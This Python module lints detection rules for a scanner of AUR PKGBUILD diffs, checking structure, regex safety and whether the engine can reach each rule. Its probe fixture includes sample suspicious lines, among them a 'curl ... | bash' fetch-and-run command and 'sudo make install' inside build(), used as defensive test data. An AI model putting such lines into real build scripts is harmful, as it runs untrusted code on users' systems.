"""Static and behavioural linting for ``rules.toml``.

A malformed rule is not a cosmetic problem.  An empty pattern matches
every line, and if its severity is FATAL every package scores 100.  A
pattern that only matches comment lines can never fire, because the
engine strips comments before matching, so the rule silently contributes
nothing.  Both failures are invisible without a corpus, and neither is
caught by the test suite.

The checks fall into three groups:

- **Structural**: required fields, duplicate ids, known severities.
- **Pattern**: compiles, does not match everything, no catastrophic
  backtracking.
- **Reachability**: the rule is run through the real matching engine to
  confirm the engine's own filtering does not make it unreachable.
"""

import re
import time
from dataclasses import dataclass

from .rules import _COMMENT_OR_DEP_RE, apply_rules

VALID_SEVERITIES = frozenset({"FATAL", "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"})
VALID_MATCH_TARGETS = frozenset({"raw_line", "resolved"})
VALID_LINE_CONTEXTS = frozenset({"function_body", "message", "other"})

# A scope may also name the enclosing PKGBUILD function, which is how a
# rule expresses "network access in pkgver() but not in build()".
VALID_FUNCTION_SCOPES = frozenset({
    "pkgver", "prepare", "build", "check", "package",
    "pre_install", "post_install", "pre_upgrade", "post_upgrade",
    "pre_remove", "post_remove",
})

VALID_SCOPES = VALID_LINE_CONTEXTS | VALID_FUNCTION_SCOPES


def _is_valid_scope(value: str) -> bool:
    """Split-package builds define package_<pkgname>() functions."""
    return value in VALID_SCOPES or value.startswith("package_")


REQUIRED_FIELDS = ("id", "name", "pattern", "severity", "category")

_ID_RE = re.compile(r"^[RC]\d{3}$")

# A realistic mini-diff, each line tagged with whether it represents
# ordinary packaging or genuinely suspicious content.  Rules are matched
# against this through the real engine so that comment filtering and
# function-body scoping apply exactly as they do in production.
#
# The benign lines are the important half: a high-severity rule that
# fires on one of them will fire across a large share of the AUR.
PROBE_DIFF: list[tuple[str, str]] = [
    ("+# upstream moved the tarball, see https://example.org/notes", "benign"),
    ("+pkgver=1.2.3", "benign"),
    ("+pkgver() {", "benign"),
    # The standard VCS idiom: local, read-only, must not be flagged.
    ("+  git describe --long --tags | sed 's/-/./g'", "benign"),
    # pkgver() reaching the network is not: it runs before review.
    ("+  curl -s https://api.example.org/latest", "suspicious"),
    ("+}", "benign"),
    ("+source=(\"https://github.com/acme/tool/archive/v1.2.3.tar.gz\")", "benign"),
    ("+sha256sums=('3b1f...')", "benign"),
    ("+depends=(curl wget sudo)", "benign"),
    ("+validpgpkeys=('ABCD1234ABCD1234')", "benign"),
    ("+build() {", "benign"),
    ("+  cd \"$srcdir/tool-1.2.3\"", "benign"),
    ("+  ./configure --prefix=/usr", "benign"),
    ("+  make", "benign"),
    ("+  make DESTDIR=\"$pkgdir\" install", "benign"),
    ("+  sudo make install", "suspicious"),
    ("+  curl -sSL https://example.org/x.sh | bash", "suspicious"),
    ("+  wget -q https://example.org/data.bin", "suspicious"),
    ("+}", "benign"),
    ("+package() {", "benign"),
    ("+  install -Dm644 config \"$pkgdir/etc/tool.conf\"", "benign"),
    ("+  install -Dm644 tool.service \"$pkgdir/usr/lib/systemd/system/tool.service\"", "benign"),
    ("+  chmod 644 \"$pkgdir/etc/tool.conf\"", "benign"),
    ("+  chmod 755 \"$pkgdir/usr/bin/tool\"", "benign"),
    ("+  install -Dm644 LICENSE \"$pkgdir/usr/share/licenses/tool/LICENSE\"", "benign"),
    ("+}", "benign"),
]

PROBE_LINES = [line for line, _ in PROBE_DIFF]

# Severities where a benign-corpus hit is a real cost, not noise.
_HIGH_SEVERITIES = frozenset({"FATAL", "CRITICAL", "HIGH", "MEDIUM"})

# Ids emitted by analysis.py rather than rules.toml.  They need diff
# context that a single-line regex cannot see, so they are generated in
# code.  A TOML rule reusing one of these ids produces two different
# findings under one id, which corrupts baselines and fixture
# expectations.
PROGRAMMATIC_IDS = frozenset({"R004", "R005", "C001", "C002", "C003"})

# A pattern that matches a function *header* line, e.g. ``pkgver() {``.
_FUNCTION_HEADER_PATTERN_RE = re.compile(r"\\\(\\\)|\(\)\\s\*\\\{|\\\(\\\)\\s\*\\\{")

# An unescaped ``$`` anchor at the end of a pattern.
_TRAILING_ANCHOR_RE = re.compile(r"(?<!\\)\$$")

SEVERITY_ERROR = "error"
SEVERITY_WARNING = "warning"


@dataclass
class LintFinding:
    rule_id: str
    level: str
    check: str
    message: str


def _pattern_matches_empty(compiled: re.Pattern) -> bool:
    """A pattern that matches the empty string matches every line."""
    return compiled.search("") is not None


# Probe inputs are deliberately short.  Detecting catastrophic
# backtracking by running the pattern means the linter pays the very cost
# it is looking for, so the input must be small enough that an
# exponential pattern is merely slow rather than hanging.  At 18
# repetitions a classic ``(a+)+$`` takes ~110ms while a linear pattern
# takes ~0.03ms; three orders of magnitude of separation, bounded.
_BACKTRACK_REPS = 18
_BACKTRACK_BUDGET_S = 0.02

_BACKTRACK_PROBES = (
    "a" * _BACKTRACK_REPS + "!",
    "a" * _BACKTRACK_REPS,
    " " * _BACKTRACK_REPS + "!",
    "https://" + "a." * (_BACKTRACK_REPS // 2) + "com",
    "curl " + "|" * _BACKTRACK_REPS,
    "/" * _BACKTRACK_REPS + "!",
)


def _backtracking_risk(compiled: re.Pattern) -> float:
    """Time *compiled* against short pathological inputs.

    Returns the worst elapsed time in seconds.
    """
    worst = 0.0
    for probe in _BACKTRACK_PROBES:
        start = time.perf_counter()
        try:
            compiled.search(probe)
        except RecursionError:
            return _BACKTRACK_BUDGET_S * 100
        worst = max(worst, time.perf_counter() - start)
    return worst


def _check_structure(rule: dict, seen_ids: dict[str, int], index: int) -> list[LintFinding]:
    rid = rule.get("id", f"<rule #{index}>")
    findings = []

    for field in REQUIRED_FIELDS:
        if not rule.get(field):
            findings.append(LintFinding(
                rid, SEVERITY_ERROR, "required-field",
                f"missing required field '{field}'",
            ))

    if "id" in rule:
        if not _ID_RE.match(rule["id"]):
            findings.append(LintFinding(
                rid, SEVERITY_WARNING, "id-format",
                f"id '{rule['id']}' does not match the R###/C### convention",
            ))
        if rule["id"] in PROGRAMMATIC_IDS:
            findings.append(LintFinding(
                rid, SEVERITY_ERROR, "programmatic-id",
                f"id '{rule['id']}' is emitted programmatically by "
                f"analysis.py; defining it here makes one id mean two "
                f"different things",
            ))
        if rule["id"] in seen_ids:
            findings.append(LintFinding(
                rid, SEVERITY_ERROR, "duplicate-id",
                f"id '{rule['id']}' already defined at position "
                f"{seen_ids[rule['id']]}; the later definition silently "
                f"changes what the earlier id means in baselines and fixtures",
            ))
        else:
            seen_ids[rule["id"]] = index

    severity = rule.get("severity")
    if severity and severity not in VALID_SEVERITIES:
        findings.append(LintFinding(
            rid, SEVERITY_ERROR, "severity",
            f"unknown severity '{severity}' (expected one of "
            f"{', '.join(sorted(VALID_SEVERITIES))}); unknown severities "
            f"score 0 via severity_weights.get(..., 0)",
        ))

    match_target = rule.get("match_target", "raw_line")
    if match_target not in VALID_MATCH_TARGETS:
        findings.append(LintFinding(
            rid, SEVERITY_ERROR, "match-target",
            f"unknown match_target '{match_target}' (expected raw_line or resolved)",
        ))

    scope = rule.get("scope")
    if scope is not None:
        if match_target != "raw_line":
            findings.append(LintFinding(
                rid, SEVERITY_WARNING, "scope-ignored",
                "scope is only honoured for match_target='raw_line'; it is "
                "ignored here",
            ))
        unknown = {v for v in scope if not _is_valid_scope(v)}
        if unknown:
            findings.append(LintFinding(
                rid, SEVERITY_ERROR, "scope",
                f"unknown scope value(s) {sorted(unknown)}; the rule can never fire",
            ))

    return findings


def _check_pattern(rule: dict) -> tuple[list[LintFinding], re.Pattern | None]:
    rid = rule.get("id", "<unknown>")
    pattern = rule.get("pattern")
    if pattern is None:
        return [], None

    if not pattern.strip():
        return [LintFinding(
            rid, SEVERITY_ERROR, "empty-pattern",
            "pattern is empty; it matches every line, so this rule fires on "
            "every package"
            + (" and, being FATAL, forces every score to 100"
               if rule.get("severity") == "FATAL" else ""),
        )], None

    try:
        compiled = re.compile(pattern, re.IGNORECASE)
    except re.error as exc:
        return [LintFinding(
            rid, SEVERITY_ERROR, "compile",
            f"pattern does not compile ({exc}); apply_rules silently skips it",
        )], None

    findings = []

    if _pattern_matches_empty(compiled):
        findings.append(LintFinding(
            rid, SEVERITY_ERROR, "matches-everything",
            "pattern matches the empty string, so it fires on every line",
        ))

    elapsed = _backtracking_risk(compiled)
    if elapsed > _BACKTRACK_BUDGET_S:
        findings.append(LintFinding(
            rid, SEVERITY_ERROR, "backtracking",
            f"pattern took {elapsed * 1000:.0f}ms on a {_BACKTRACK_REPS}-character "
            f"adversarial input; cost grows exponentially, so a crafted "
            f"PKGBUILD line could hang the scan",
        ))

    return findings, compiled


def _check_reachability(rule: dict, compiled: re.Pattern) -> list[LintFinding]:
    """Confirm engine filtering does not make an otherwise-valid rule dead."""
    rid = rule.get("id", "<unknown>")
    match_target = rule.get("match_target", "raw_line")
    findings = []

    if rule.get("scope") and _FUNCTION_HEADER_PATTERN_RE.search(rule.get("pattern", "")):
        findings.append(LintFinding(
            rid, SEVERITY_ERROR, "scope-contradiction",
            f"pattern matches a function header line, but scope "
            f"{rule['scope']} excludes it: _classify_line_context assigns the "
            f"header itself to 'other' and only *subsequent* lines to "
            f"'function_body', so this rule can never fire",
        ))

    if match_target == "raw_line" and _TRAILING_ANCHOR_RE.search(rule.get("pattern", "")):
        findings.append(LintFinding(
            rid, SEVERITY_WARNING, "end-anchor",
            "pattern is anchored to end-of-line, but raw diff lines keep "
            "their trailing quotes and parentheses (e.g. a source line ends "
            "in '\")'), so the anchor will rarely match",
        ))

    direct = [line for line in PROBE_LINES if compiled.search(line)]
    if not direct:
        # No probe coverage.  Silence rather than guess: absence of a
        # match here says the probe corpus is narrow, not that the rule
        # is dead.
        return findings

    # include_experimental: we are linting the rule itself, not simulating
    # whether production would currently run it.
    fired = apply_rules(PROBE_LINES, PROBE_LINES, [rule], include_experimental=True)

    if not fired:
        if match_target == "raw_line" and all(
            _COMMENT_OR_DEP_RE.match(line) for line in direct
        ):
            findings.append(LintFinding(
                rid, SEVERITY_ERROR, "comment-shadowed",
                "every line this pattern matches is a comment or a depends "
                "declaration, and filter_raw_lines strips those before "
                "matching; the rule can never fire",
            ))
        elif rule.get("scope"):
            findings.append(LintFinding(
                rid, SEVERITY_WARNING, "scope-shadowed",
                f"pattern matches probe lines but none in scope "
                f"{rule['scope']}",
            ))
        return findings

    if rule.get("severity") in _HIGH_SEVERITIES:
        benign_hits = [
            line for line, label in PROBE_DIFF
            if label == "benign" and compiled.search(line)
            and not (match_target == "raw_line" and _COMMENT_OR_DEP_RE.match(line))
        ]
        if benign_hits:
            findings.append(LintFinding(
                rid, SEVERITY_WARNING, "benign-hit",
                f"severity {rule['severity']} but fires on ordinary packaging: "
                f"{benign_hits[0].strip()!r}"
                + (f" (+{len(benign_hits) - 1} more)" if len(benign_hits) > 1 else ""),
            ))

    return findings


def lint_rules(rules: list[dict]) -> list[LintFinding]:
    """Lint a rule list, returning findings ordered by rule position."""
    findings: list[LintFinding] = []
    seen_ids: dict[str, int] = {}

    for index, rule in enumerate(rules):
        findings.extend(_check_structure(rule, seen_ids, index))
        pattern_findings, compiled = _check_pattern(rule)
        findings.extend(pattern_findings)
        if compiled is not None:
            findings.extend(_check_reachability(rule, compiled))

    return findings
